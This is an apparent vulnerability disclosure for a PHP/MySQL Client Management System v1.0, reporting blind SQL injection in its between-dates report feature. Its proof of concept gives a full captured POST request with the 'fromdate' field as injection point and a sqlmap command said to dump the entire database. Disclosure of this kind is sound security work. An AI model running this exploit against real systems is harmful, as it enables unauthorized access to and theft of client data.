# Client-Management-System (v1.0)

## Overview

The Client Management System (CMS) is a web-based application developed using PHP and MySQL for the effective management of client information. This repository contains the source code and comprehensive details of the system, along with a report highlighting a security vulnerability.

**Auditor:**  
Haneen Gufran - [LinkedIn](https://www.linkedin.com/in/haneen-gufran-a8b4a6227)

---

## Security Vulnerability Report

### Description

A **Blind SQL Injection** vulnerability has been identified within the Client Management System. The vulnerability is found in the `Between Dates Reports` parameter in the date functionality of the application.

- **Vulnerable Endpoint:**  
  `http://localhost/clientms/admin/bwdates-reports-ds.php`
  
- **Vulnerable Parameter:**  
  `Between Dates Reports`

The input field for the `Between Dates Reports` feature is not properly sanitized, allowing attackers to inject malicious SQL queries. If exploited, this vulnerability could provide unauthorized access to sensitive database information.

### Proof of Concept (PoC)

#### Vulnerable URL
```plaintext
http://localhost/clientms/admin/bwdates-reports-ds.php

#### Example POST Request

```http
POST /clientms/admin/bwdates-reports-details.php HTTP/1.1
Host: localhost
Content-Length: 345
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCxxk35suiVL6Px2B
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/clientms/admin/bwdates-reports-ds.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=p4cek0j306h831oqgio6cb0fid
Connection: keep-alive

------WebKitFormBoundaryCxxk35suiVL6Px2B
Content-Disposition: form-data; name="fromdate"

*
------WebKitFormBoundaryCxxk35suiVL6Px2B
Content-Disposition: form-data; name="todate"

0093-08-22
------WebKitFormBoundaryCxxk35suiVL6Px2B
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryCxxk35suiVL6Px2B--
```

1. Save the above POST Request to req.txt using notepad or any text editor.

2. Use tool such as SQLMAP to exploit the above by applying this command (you can customize yours): sqlmap -r req.txt --dbs --random-agent --level 3 --risk 3

The above command will dump the entire database of the web application.
